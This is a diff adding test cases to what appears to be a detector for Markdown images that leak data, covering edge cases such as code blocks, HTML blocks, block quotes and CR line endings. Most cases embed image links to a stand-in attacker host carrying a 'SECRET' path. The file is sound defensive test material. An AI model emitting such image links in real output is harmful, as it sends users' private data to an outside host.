@@ -130,6 +130,12 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
         "![a\nb][]",
         # A shortcut label that spans lines still needs a matching definition.
         "![quarterly\nreport]",
+        # A definition inside a code block is code, so the label renders literally.
+        "![a\nb]\n\n```\n[a b]: https://evil.example/SECRET/p.png\n```",
+        # HTML blocks are raw HTML, not Markdown.
+        "<!--\n![a\nb](https://evil.example/SECRET/p.png)\n-->",
+        "<script>\n![a\nb](https://evil.example/SECRET/p.png)\n</script>",
+        "<div>\n![a\nb](https://evil.example/SECRET/p.png)\n</div>",
     ],
 )
 async def test_md_image_lookalikes_not_detected(text: str, patch_central_database):
@@ -173,6 +179,18 @@ async def test_md_image_lookalikes_not_detected(text: str, patch_central_databas
             "> ![quarterly\n> report]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
             "Markdown Image (shortcut reference)",
         ),
+        # A definition inside a block quote is read without its quote markers.
+        (
+            "> ![a\n> b][r]\n>\n> [r]: https://evil.example/SECRET/p.png",
+            "Markdown Image (reference)",
+        ),
+        # A definition after lone CR line endings is still a definition.
+        (
+            "![quarterly\rreport]\r\r[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        # Inline HTML around an image does not start an HTML block.
+        ("<span>![a\nb](https://evil.example/SECRET/p.png)</span>", "Markdown Image (inline)"),
         # A code fence ends with the block quote or list item that holds it.
         ("> ```\n> code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         ("- ```\n  code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
